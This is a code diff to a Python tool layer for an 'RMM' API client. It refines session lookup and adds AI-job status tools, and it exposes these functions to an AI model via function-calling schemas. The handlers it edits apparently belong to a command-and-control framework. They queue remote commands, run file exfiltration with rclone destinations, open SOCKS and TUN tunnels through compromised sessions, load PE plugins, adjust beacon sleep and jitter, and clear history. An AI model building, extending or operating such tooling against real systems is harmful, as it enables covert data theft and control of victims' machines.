@@ -41,14 +41,10 @@ def _json_result(payload: Any) -> str:
 
 
 def _resolve_session_id(client: RmmApiClient, session_ref: str) -> tuple[str | None, dict]:
-    """Resolve full session id from prefix, full id, or hostname."""
+    """Resolve only an unambiguous reference from the caller's visible sessions."""
     ref = (session_ref or "").strip()
     if not ref:
         return None, {"error": "session_ref required"}
-
-    code, data = client.get_session(ref)
-    if code == 200 and data.get("session"):
-        return data["session"]["id"], data["session"]
 
     code, data = client.list_sessions()
     if code != 200:
@@ -56,14 +52,20 @@ def _resolve_session_id(client: RmmApiClient, session_ref: str) -> tuple[str | N
 
     sessions = data.get("sessions", [])
     ref_upper = ref.upper()
-    for s in sessions:
-        if s["id"] == ref or s["id"].startswith(ref):
-            return s["id"], s
-    for s in sessions:
-        if (s.get("hostname") or "").upper() == ref_upper:
-            return s["id"], s
-        if (s.get("hostname") or "").upper().startswith(ref_upper):
-            return s["id"], s
+    exact_ids = [s for s in sessions if s["id"] == ref]
+    exact_hosts = [s for s in sessions if (s.get("hostname") or "").upper() == ref_upper]
+    prefixes = [s for s in sessions if s["id"].startswith(ref)
+                or (s.get("hostname") or "").upper().startswith(ref_upper)]
+    matches = exact_ids or exact_hosts or prefixes
+    if len(matches) == 1:
+        return matches[0]["id"], matches[0]
+    if len(matches) > 1:
+        return None, {
+            "error": "ambiguous_session_ref",
+            "session_ref": ref,
+            "detail": "Use a full session ID from the visible candidates.",
+            "candidates": [{"id": s["id"], "hostname": s.get("hostname")} for s in matches],
+        }
 
     return None, {"error": "session_not_found", "session_ref": ref}
 
@@ -100,13 +102,7 @@ def tool_health(client: RmmApiClient) -> str:
 
 
 def tool_list_sessions(client: RmmApiClient) -> str:
-    if not client.token:
-        return _json_result({
-            "ok": False,
-            "status": 401,
-            "error": "missing_api_token",
-            "detail": "Set RMM_API_TOKEN (MCP env or web UI login Bearer token)",
-        })
+    # The API validates either operator or workspace credentials and scopes results.
     code, data = client.list_sessions()
     if code != 200:
         return _json_result({"ok": False, "status": code, "data": data})
@@ -142,9 +138,9 @@ def tool_exec_command(
     command: str,
     timeout: float = 120,
 ) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.exec_command(sid, command, timeout=timeout)
     if code == 408:
         return _json_result({"ok": False, "error": "timeout", "command": command})
@@ -165,9 +161,9 @@ def tool_queue_command(
     command: str,
     cmd_type: str = "oneshot",
 ) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.queue_command(sid, command, cmd_type=cmd_type)
     return _json_result({
         "ok": code == 200,
@@ -184,9 +180,9 @@ def tool_patch_config(
     sleep_seconds: int | None = None,
     jitter_percent: int | None = None,
 ) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.patch_config(sid, sleep_seconds=sleep_seconds, jitter_percent=jitter_percent)
     return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
 
@@ -197,9 +193,9 @@ def tool_get_events(
     since: int = 0,
     limit: int = 50,
 ) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.get_events(sid, since=since, limit=limit)
     if code != 200:
         return _json_result({"ok": False, "status": code, "data": data})
@@ -207,17 +203,17 @@ def tool_get_events(
 
 
 def tool_kill_session(client: RmmApiClient, session_ref: str) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.kill_session(sid)
     return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
 
 
 def tool_queue_download(client: RmmApiClient, session_ref: str, remote_path: str) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.queue_download(sid, remote_path)
     return _json_result({"ok": code == 200, "status": code, "queued": remote_path, "data": data})
 
@@ -230,9 +226,9 @@ def tool_queue_exfil(
     dest: str | None = None,
     mode: str = "auto",
 ) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.queue_exfil(sid, remote_path, profile=profile, dest=dest, mode=mode)
     return _json_result({
         "ok": code == 200,
@@ -248,9 +244,9 @@ def tool_get_rclone_config(client: RmmApiClient) -> str:
 
 
 def tool_queue_screenshot(client: RmmApiClient, session_ref: str) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.queue_screenshot(sid)
     return _json_result({"ok": code == 200, "status": code, "data": data})
 
@@ -348,9 +344,9 @@ def tool_queue_pe_load(
     plugin_input: str = "",
     plugin_command: str = "",
 ) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.queue_pe_load(
         sid,
         plugin,
@@ -367,9 +363,9 @@ def tool_queue_upload(
     local_path: str,
     remote_path: str,
 ) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     local = Path(local_path).expanduser()
     if not local_path.startswith("artifact:") and not local.is_file():
         return _json_result({"ok": False, "error": "local_file_not_found", "path": str(local)})
@@ -392,17 +388,17 @@ def tool_start_socks(
     port: int = 1080,
     bind_host: str = "127.0.0.1",
 ) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.start_socks(sid, port=port, bind_host=bind_host)
     return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
 
 
 def tool_stop_socks(client: RmmApiClient, session_ref: str) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.stop_socks(sid)
     return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
 
@@ -426,9 +422,9 @@ def tool_start_tun(
     udp_timeout_seconds: int = 300,
     routes: list[str] | None = None,
 ) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.start_tun(
         sid,
         device,
@@ -443,9 +439,9 @@ def tool_start_tun(
 
 
 def tool_stop_tun(client: RmmApiClient, session_ref: str) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.stop_tun(sid)
     return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
 
@@ -552,9 +548,9 @@ def tool_clear_history(client: RmmApiClient) -> str:
 
 
 def tool_list_session_downloads(client: RmmApiClient, session_ref: str) -> str:
-    sid, _ = _resolve_session_id(client, session_ref)
+    sid, info = _resolve_session_id(client, session_ref)
     if not sid:
-        return _json_result({"ok": False, "error": "session_not_found"})
+        return _json_result({"ok": False, **info})
     code, data = client.list_session_downloads(sid)
     if code != 200:
         return _json_result({"ok": False, "status": code, "data": data})
@@ -586,6 +582,18 @@ def tool_list_artifacts(client: RmmApiClient, kind: str = "downloads") -> str:
         "count": len(artifacts),
         "artifacts": artifacts,
     })
+
+
+def tool_list_ai_jobs(client: RmmApiClient, session_id: str = "") -> str:
+    """List persisted AI jobs without starting or retrying execution."""
+    code, data = client.list_ai_jobs(session_id)
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
+def tool_get_ai_job(client: RmmApiClient, job_id: str) -> str:
+    """Read a job's progress and final result within the caller's scope."""
+    code, data = client.get_ai_job(job_id)
+    return _json_result({"ok": code == 200, "status": code, "data": data})
 
 
 def tool_get_agent_script(client: RmmApiClient) -> str:
@@ -664,6 +672,8 @@ def tool_remove_persistence(client: RmmApiClient, session_ref: str) -> str:
 
 
 TOOL_HANDLERS = {
+    "list_ai_jobs": lambda c, a: tool_list_ai_jobs(c, a.get("session_id", "")),
+    "get_ai_job": lambda c, a: tool_get_ai_job(c, a["job_id"]),
     "settings": lambda c, a: tool_settings(c, a.get("action", "show"), a.get("settings")),
     "embedding_profiles": lambda c, a: tool_embedding_profiles(c, a.get("action", "list"), a.get("name", ""), a.get("config")),
     "run_embeddings": lambda c, a: tool_run_embeddings(c, a["session_ref"], a["profile"], a["documents"]),
@@ -791,6 +801,22 @@ def execute_tool(client: RmmApiClient, name: str, arguments: dict | str) -> str:
 
 
 OPENAI_TOOLS: list[dict] = [
+    {
+        "type": "function",
+        "function": {
+            "name": "list_ai_jobs",
+            "description": "List persisted AI jobs, optionally filtered by full session ID. Does not start or retry work.",
+            "parameters": {"type": "object", "properties": {"session_id": {"type": "string"}}},
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "get_ai_job",
+            "description": "Read an AI job's status, progress, and final result by ID. An interrupted job may have executed actions; do not blindly resubmit it.",
+            "parameters": {"type": "object", "properties": {"job_id": {"type": "string"}}, "required": ["job_id"]},
+        },
+    },
     {
         "type": "function",
         "function": {
